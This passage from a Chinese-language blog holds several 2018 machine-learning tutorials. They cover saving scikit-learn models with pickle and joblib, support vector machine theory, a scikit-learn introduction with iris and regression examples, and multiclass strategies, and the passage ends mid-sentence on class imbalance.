<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">iris_x = iris.data</span><br><span class="line"></span><br><span class="line">file = open(&quot;model/knn.pickle&quot;,&quot;rb&quot;)</span><br><span class="line">knn=pickle.load(file)</span><br><span class="line"></span><br><span class="line">pred = knn.predict(iris_x[0:5])</span><br><span class="line">print(pred)</span><br></pre></td></tr></table></figure>
<p>读取模型时直接读取这个文件，就可以使用现有模型，在以上代码中使用这个模型预测了前五个数据，我们都知道鸢尾花数据集前五个样本分类都是0，将它们放在这个模型中预测输出，发现也都是0。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn15.png?raw=true" alt=""></p>
<h3 id="使用joblib保存模型"><a href="#使用joblib保存模型" class="headerlink" title="使用joblib保存模型"></a>使用joblib保存模型</h3><p>第二种方法是用sklearn的joblib模块保存，joblib库会自动多线程运行，所以在面对大数据的时候性能要优于pickle模块，但是joblib模块只能将文件保存在磁盘中，而且会产生多个文件。</p>
<p>保存模型：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.neighbors import KNeighborsClassifier</span><br><span class="line">from sklearn.externals import joblib</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">iris_x = iris.data</span><br><span class="line">iris_y = iris.target</span><br><span class="line"></span><br><span class="line">knn = KNeighborsClassifier()</span><br><span class="line">knn.fit(iris_x,iris_y)</span><br><span class="line"></span><br><span class="line">joblib.dump(knn,&apos;model/knn.pkl&apos;)</span><br></pre></td></tr></table></figure>
<p>然后当前程序目录中model子目录下就会产生一个knn.pkl的文件，有时会产生多个文件，但是读取时只用读取第一个。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn16.png?raw=true" alt=""></p>
<p>读取模型：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.externals import joblib</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">iris_x = iris.data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">knn=joblib.load(&apos;model/knn.pkl&apos;)</span><br><span class="line"></span><br><span class="line">pred = knn.predict(iris_x[0:5])</span><br><span class="line">print(pred)</span><br></pre></td></tr></table></figure>
<p>测试结果仍然成立。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn17.png?raw=true" alt=""></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/31/机器学习-8-——支持向量机-SVM/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/07/31/机器学习-8-——支持向量机-SVM/" itemprop="url">
                  机器学习(8)——支持向量机(SVM)
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-31T10:27:12+08:00">
                2018-07-31
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/机器学习/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/07/31/机器学习-8-——支持向量机-SVM/" class="leancloud_visitors" data-flag-title="机器学习(8)——支持向量机(SVM)">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-支持向量机"><a href="#0x00-支持向量机" class="headerlink" title="0x00 支持向量机"></a>0x00 支持向量机</h2><p>在机器学习中，支持向量机（support vector machine，常简称为SVM，又名支持向量网络）是在分类与回归分析中分析数据的监督式学习模型与相关的学习算法。给定一组训练实例，每个训练实例被标记为属于两个类别中的一个或另一个，SVM训练算法建立一个将新的实例分配给两个类别之一的模型，使其成为非概率二元（binary classifier）线性分类器。SVM模型是将实例表示为空间中的点，这样映射就使得单独类别的实例被尽可能宽的明显的间隔分开。然后，将新的实例映射到同一空间，并基于它们落在间隔的哪一侧来预测所属类别。</p>
<h2 id="0x01-间隔与支持向量"><a href="#0x01-间隔与支持向量" class="headerlink" title="0x01 间隔与支持向量"></a>0x01 间隔与支持向量</h2><p>首先看一张图：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_01.png?raw=true" alt=""></p>
<p>如果要用一条直线将两种类型的图形分开，那这样的直线我们可以找到很多条。那么哪条才是最好的分割线？</p>
<p>我们可以设想一下，目前的样本并不代表所有可能发生的情况，如果进入新样本，很有可能会存在向直线贴近的样本，那么如果选择的直线到两边最近的点间隔越长，输入新样本时越过这条线的机会就越小，泛化能力就越强。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_05.png?raw=true" alt=""></p>
<p>图中距离这条分割线最近的这几个点，就被称为支持向量。</p>
<p>两个异类支持向量到这条直线的距离之和，就被称为间隔。</p>
<p>假设我们分割线的方程如下：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_02.png?raw=true" alt=""></p>
<p>其中w是法向量。</p>
<p>我们的可以通过它将训练样本正确分类，即</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_03.png?raw=true" alt=""></p>
<p>留出间隔，令：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_04.png?raw=true" alt=""></p>
<p>则间隔的数学表示为：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_06.png?raw=true" alt=""></p>
<p>我们为了找到最大间隔，也就是使γ最大，也就是使||w||²最小，就可以转换成找</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_07.png?raw=true" alt=""></p>
<p>的最小值。这被称为支持向量机的基本型。</p>
<h2 id="0x02-对偶问题"><a href="#0x02-对偶问题" class="headerlink" title="0x02 对偶问题"></a>0x02 对偶问题</h2><p>上面的问题最终转换成求支持向量机基本型的最小值问题，这是一个凸二次规划问题，可以直接求解，但是我们有更优的计算方法。那就是通过拉格朗日乘子法得到其”对偶问题“。</p>
<p>具体做法是对每条约束都增加拉格朗日乘子αi，则该问题可以写成：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_08.png?raw=true" alt=""></p>
<p>这个时候要求其最小值，从之前转换成最小值的模型前加了1/2这点就可以想到，我们接下来肯定要通过求导，求导数零点，找极值点来完成。</p>
<p>所以分别对w和b求导可以得出：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_09.png?raw=true" alt=""></p>
<p>将其结论代回L中可得对偶问题：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_10.png?raw=true" alt=""></p>
<p>这个结果，我们就可以直接交给机器去处理数据求这个式子的最大值了。</p>
<h2 id="0x03-核函数"><a href="#0x03-核函数" class="headerlink" title="0x03 核函数"></a>0x03 核函数</h2><p>线性可分的训练样本我们可以通过直线将其正确分类，但是如果遇到线性不可分的训练样本，或许就不能通过一条直线来进行分割。</p>
<p>这种情况下，我们可以将样本从原本的空间映射到一个更高维度的空间，使样本在这个空间内线性可分。</p>
<p>比如二维平面中的样本投影到三维空间中，就可以通过一个超平面线性分割两类样本了：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_11.png?raw=true" alt=""></p>
<p>具体做法是用Φ(x)代表x映射之后的特征向量，对偶问题就变为：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_12.png?raw=true" alt=""></p>
<p>在计算Φ(xi)的转置与Φ(xj)的矩阵乘积时，在高维会变的十分困难，所以就引入了：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_13.png?raw=true" alt=""></p>
<p>Φ(xi)与Φ(xj)内积等于它们在原始样本空间通过k函数计算的结果，这样就不用去高维计算内积。这个k函数就被称为核函数。</p>
<p>常用的核函数如下：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_14.png?raw=true" alt=""></p>
<p>并不是所有的情况通过核函数映射之后都是线性可分的，我们会根据实际的情况去选取合适的核函数，使其映射到高维之后可以分割，然后高维分割的超平面在原始平面上的投影就是在原始平面上的分割曲线。</p>
<h2 id="0x04-硬间隔和软间隔"><a href="#0x04-硬间隔和软间隔" class="headerlink" title="0x04 硬间隔和软间隔"></a>0x04 硬间隔和软间隔</h2><p>即使使用了核函数，实际中，我们仍然存在一种不可分的情况，即两类样本互相有一部分出现在对方的区域，如图：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_15.png?raw=true" alt=""></p>
<p>那么这种情况，我们的处理方式就是允许支持向量机在一些样本上出错，也就是“软间隔”。</p>
<p>对应的所有样本都被正确分类就被称为“硬间隔”。</p>
<p>在之前机器学习的经验中我们都明白，出错就会有损失，那么我们需要一个损失函数来计算惩罚，最终的优化目标是在最大化间隔的同时使不满足约束的样本尽可能少，可写为：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_16.png?raw=true" alt=""></p>
<p>这里面使用的损失函数是0/1损失函数：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_17.png?raw=true" alt=""></p>
<p>我们也有其他几种替代损失函数可供选择：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_18.png?raw=true" alt=""></p>
<p>在软间隔情况中，只使满足最终优化目标的值优化到最小即可。</p>
<h2 id="0x05-支持向量机的优缺点"><a href="#0x05-支持向量机的优缺点" class="headerlink" title="0x05 支持向量机的优缺点"></a>0x05 支持向量机的优缺点</h2><p>支持向量机的优势在于:</p>
<ul>
<li><p>在高维空间中非常高效</p>
</li>
<li><p>即使在数据维度比样本数量大的情况下仍然有效</p>
</li>
<li><p>在决策函数（称为支持向量）中使用训练集的子集,因此它也是高效利用内存的</p>
</li>
<li><p>通用性: 不同的核函数 核函数与特定的决策函数一一对应，常见的kernel已<br>经提供,也可以指定定制的内核</p>
</li>
</ul>
<p>支持向量机的缺点包括:</p>
<ul>
<li><p>如果特征数量比样本数量大得多,在选择核函数 核函数 时要避免过拟合,<br>而且正则化项是非常重要的</p>
</li>
<li><p>支持向量机不直接提供概率估计</p>
</li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/30/python-scikit-learn学习-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/07/30/python-scikit-learn学习-1/" itemprop="url">
                  python-scikit learn学习(1)
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-30T16:18:08+08:00">
                2018-07-30
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/机器学习/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/07/30/python-scikit-learn学习-1/" class="leancloud_visitors" data-flag-title="python-scikit learn学习(1)">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-scikit-learn"><a href="#0x00-scikit-learn" class="headerlink" title="0x00 scikit-learn"></a>0x00 scikit-learn</h2><p>Scikit-learn（以前称为scikits.learn）是一个用于Python编程语言的免费开源机器学习库。它广泛地支持各种分类、聚类以及回归分析方法比如支持向量机、随机森林、DBSCAN等等，由于其强大的功能、优异的拓展性以及易用性，目前受到了很多数据科学从业者的欢迎，也是业界相当著名的一个开源项目之一。</p>
<h2 id="0x01-scikit-learn安装"><a href="#0x01-scikit-learn安装" class="headerlink" title="0x01 scikit-learn安装"></a>0x01 scikit-learn安装</h2><p>scikit-learn安装和别的python安装没有多少不同，不过安装scikit-learn之前要先安装新版本的numpy和scipy库。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install numpy</span><br><span class="line">pip install scipy</span><br><span class="line">pip install scikit-learn</span><br></pre></td></tr></table></figure></p>
<h2 id="0x02-scikit-learn数据集"><a href="#0x02-scikit-learn数据集" class="headerlink" title="0x02 scikit-learn数据集"></a>0x02 scikit-learn数据集</h2><p>scikit-learn库中有一些标准数据集。在scikit-learn官网的数据库中有大量的数据集，可以直接拿来使用。</p>
<p>官方数据集： <a href="http://scikit-learn.org/stable/modules/classes.html#module-sklearn.datasets" target="_blank" rel="noopener">http://scikit-learn.org/stable/modules/classes.html#module-sklearn.datasets</a></p>
<p>其中Loaders都是现实中一些整理好的数据，可以直接使用。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn01.png?raw=true" alt=""></p>
<p>Samples generator中是一些用户可以通过输入参数来控制随机生成的数据。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn02.png?raw=true" alt=""></p>
<p>使用时我们要先导入sklearn.datasets库，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">iris = datasets.load_iris() #鸢尾花数据集</span><br><span class="line">print(iris)</span><br><span class="line">digits = datasets.load_digits() #数字数据集</span><br><span class="line">print(digits)</span><br></pre></td></tr></table></figure></p>
<ul>
<li>一个数据集是一个包含数据所有元素的类字典对象，这个数据存在‘.data’成员变量中，是一个n*n数组行表示样例，列表示特征。</li>
<li>在监督学习中，一个或多个标签Y存储在‘.target’成员变量中。</li>
</ul>
<p>从如下代码运行结果就能看出这几部分数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">digits = datasets.load_digits() #数字数据集</span><br><span class="line">print(digits.data)</span><br><span class="line">print(digits.target)</span><br><span class="line">print(digits.images[0])</span><br></pre></td></tr></table></figure>
<h2 id="0x03-scikit-learn学习方法选择"><a href="#0x03-scikit-learn学习方法选择" class="headerlink" title="0x03 scikit-learn学习方法选择"></a>0x03 scikit-learn学习方法选择</h2><p>在学习和预测之前，我们要根据我们的数字数据集以及要达成的目标选择合适的机器学习方法，scikit-learn官网有一张图清晰的给出了如何去选择正确的方法：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn03.png?raw=true" alt=""></p>
<p>官方网站提供的原图地址： <a href="http://scikit-learn.org/stable/tutorial/machine_learning_map/index.html" target="_blank" rel="noopener">http://scikit-learn.org/stable/tutorial/machine_learning_map/index.html</a></p>
<p>我介绍一下具体步骤：</p>
<ul>
<li><p>这张图从start部分开始读，如果数据少于50，就去获取更多数据，如果数据大于50，就进入下一步。</p>
</li>
<li><p>然后根据是否预测类别、有无标签、是否预测数量等判断分别属于分类问题、聚类问题、回归问题和降维问题四种中的哪一种。</p>
</li>
<li><p>再根据数据量、数据类型等来分别选择合适的机器学习算法。</p>
</li>
</ul>
<p>在选择好方法之后，从scikit-learn库导入对应的方法，然后根据官方提供的使用方法进行调用和参数的选用，就可以进行学习。</p>
<h2 id="0x04-scikit-learn学习与预测（分类问题）"><a href="#0x04-scikit-learn学习与预测（分类问题）" class="headerlink" title="0x04 scikit-learn学习与预测（分类问题）"></a>0x04 scikit-learn学习与预测（分类问题）</h2><p>在这里以鸢尾花数据集的学习和预测为例，讲解一下通用的scikit-learn学习与预测步骤，先贴代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import numpy</span><br><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.model_selection import train_test_split</span><br><span class="line">from sklearn.neighbors import KNeighborsClassifier</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line">iris_x = iris.data</span><br><span class="line">iris_y = iris.target</span><br><span class="line">#print(iris_y)</span><br><span class="line"></span><br><span class="line">x_trian,x_test,y_train,y_test = train_test_split(iris_x,iris_y,test_size=0.25)</span><br><span class="line"></span><br><span class="line">#print(y_train)</span><br><span class="line"></span><br><span class="line">knn = KNeighborsClassifier()</span><br><span class="line">knn.fit(x_trian,y_train)</span><br><span class="line">y_predict = knn.predict(x_test)</span><br><span class="line"></span><br><span class="line">print(y_predict)</span><br><span class="line">pritn(y_test)</span><br></pre></td></tr></table></figure>
<ul>
<li>上面的代码从sklearn的数据库导入了鸢尾花数据集，然后将data作为特征，target作为标签。</li>
<li>然后通过train_test_split方法将特征和标签分成训练集和测试集并打乱顺序，其中test_size控制测试集占比0.25。</li>
<li>然后使用KNeighborsClassifier机器学习方法，学习训练集，并用训练好的模型预测测试集中x_test对应的分类结果。</li>
<li>最后将预测的分类结果y_predict与原始数据中的分类结果y_test输出后对比</li>
</ul>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn04.png?raw=true" alt=""></p>
<p>从最终输出结果可以看到，基本都预测成功了，如果我们样本量更大一点，或许会找到一些错误预测结果。</p>
<h2 id="0x05-scikit-learn学习与预测（回归问题）"><a href="#0x05-scikit-learn学习与预测（回归问题）" class="headerlink" title="0x05 scikit-learn学习与预测（回归问题）"></a>0x05 scikit-learn学习与预测（回归问题）</h2><p>再使用datasets中提供的自动生成数据的方法来预测一个回归问题。同样先贴代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.linear_model import LinearRegression</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">example_x,example_y = datasets.make_regression(n_samples=100,n_features=1,n_targets=1,noise=3)</span><br><span class="line"></span><br><span class="line">plt.scatter(example_x,example_y)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">lr = LinearRegression()</span><br><span class="line">lr.fit(example_x,example_y)</span><br><span class="line"></span><br><span class="line">print(lr.predict(example_x[:5,:]))</span><br><span class="line">print(example_y[:5])</span><br></pre></td></tr></table></figure>
<ul>
<li>上面代码中，首先使用make_regression生成随机的回归数据，其中n_samples代表数据数量，n_features代表特征数量，n_targets代表特征数量，noise代表噪声大小</li>
<li>然后使用matplotlib模块将生成的二维数据绘制出来</li>
<li>接着使用LinearRegression机器学习方法，学习训练集，并用训练好的模型预测样本中前五个数据</li>
<li>最后将预测结果与原始数据的标签值输出进行对比</li>
</ul>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn05.png?raw=true" alt=""></p>
<p>从二维图形可以看出生成数据的分布。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn06.png?raw=true" alt=""></p>
<p>从输出结果可以看出，预测结果基本符合，但是有一定的误差。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/26/机器学习-7-——多分类学习/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/07/26/机器学习-7-——多分类学习/" itemprop="url">
                  机器学习(7)——多分类学习
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-26T14:59:28+08:00">
                2018-07-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/机器学习/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/07/26/机器学习-7-——多分类学习/" class="leancloud_visitors" data-flag-title="机器学习(7)——多分类学习">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前在逻辑回归中也提到了多分类问题，但是仅仅介绍了其中一种情况。多分类还存在一些其他的方式与问题，在这里总结一遍，用作笔记。</p>
<p>除过那些直接可以由二分类算法推广到多分类的情况，我们就是基于一些策略利用二分类学习器来解决多分类问题。</p>
<h2 id="0x01-一对一-One-vs-One"><a href="#0x01-一对一-One-vs-One" class="headerlink" title="0x01 一对一(One vs. One)"></a>0x01 一对一(One vs. One)</h2><p>OvO策略是将N个类别，两两配对分类，一共就产生了N(N-1)/2个二分类任务。在测试阶段，我们将新样本提交给所有的分类器，一共得到N(N-1)/2个分类结果，而最终这个新样本属于哪一类，可以通过投票产生，即这N(N-1)/2个分类结果中，预测得到最多得那个分类作为最终分类结果。</p>
<h2 id="0x02-一对其余-One-vs-Rest"><a href="#0x02-一对其余-One-vs-Rest" class="headerlink" title="0x02 一对其余(One vs. Rest)"></a>0x02 一对其余(One vs. Rest)</h2><p>OvR策略是将N个类别，每次分别取一类作一次正例，其余类都作为反例，一共训练N个分类器。在测试阶段，我们将新样本提交给所有分类器，一共产生N个分类结果，这N个结果中置信度最高的一个就是最终结果。</p>
<h2 id="0x03-多对多-Many-vs-Many"><a href="#0x03-多对多-Many-vs-Many" class="headerlink" title="0x03 多对多(Many vs. Many)"></a>0x03 多对多(Many vs. Many)</h2><p>MvM策略是每次将一部分类作为正类，一部分其他类作为反类。MvM的正反类构造不能随意选取，必须有特殊的设计。</p>
<p>最常用的MvM技术是“纠错输出码”(Error Correcting Output Codes)</p>
<p>纠错输出码是将编码的思想引入类别拆分，并尽可能在解码的过程中具有容错性。纠错输出码的工作过程：</p>
<ul>
<li>（1）编码：对N个类别做M次划分，每次划分将一部分类别划为正类，一部分划为反类，从而形成一个二分类训练集。这样一共产生M个训练集，可以训练出M个分类器。</li>
<li>（2）解码：M个分类器分别对测试样本进行预测，这些预测标记组成一个编码，将这个预测编码与每个类别各自的编码进行比较，返回其中距离最小的类别作为最终预测结果。</li>
</ul>
<p>类别划分时使用编码矩阵表示，目前主要的编码矩阵是二元码和三元码：</p>
<ul>
<li>二元码： 每个类别有正类、反类两种情况。</li>
<li>三元码： 每个类别有正类、反类、停用类三种情况。</li>
</ul>
<p>如图所示：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml7_01.png?raw=true" alt=""></p>
<p>以二元码为例，图中使用五个分类器进行MvM分类，然后根据对不同类别的正反分类构成了黑白相间的编码矩阵。</p>
<p>在解码时，我们将样例输入到五个分类器中，得到一个长度为5的测试样例，然后跟矩阵中c1、c2、c3、c4四个类别的编码方式比较，计算其欧氏距离，距离最小的类别c3就是最终预测结果，也就是说此样例被分类到c3。</p>
<p>如果MvM用到的分类器越多，横轴也会越长，编码长度也就越长，这样即使有个别分类器预测错误，也不会影响最终结果。也就是说，分类器越多纠错能力越强。不过分类器越多，我们需要训练的次数也就越多，计算量就会增大，所以应当根据实际情况选择合适的分类器数量。</p>
<h2 id="0x04-类别不平衡问题"><a href="#0x04-类别不平衡问题" class="headerlink" title="0x04 类别不平衡问题"></a>0x04 类别不平衡问题</h2><p>在通常的分类任务中，我们默认几类几类情况的发生几率差距不是特别大，但是如果某一类情况发生几率十分大，比如99.9%，另一类发生几率特别小，比如0.1%。</p>
<p>这种情况下，我们的样本正例太多，反例太少，学习器往往会出现一些误差。</p>
<p>此时我们需要用m+表示正例数目，m-表示反例数目，观测几率就是m+/m-，这个时候我们只需要分类器预测几率高于观测几率就应判定为正例，即</p>
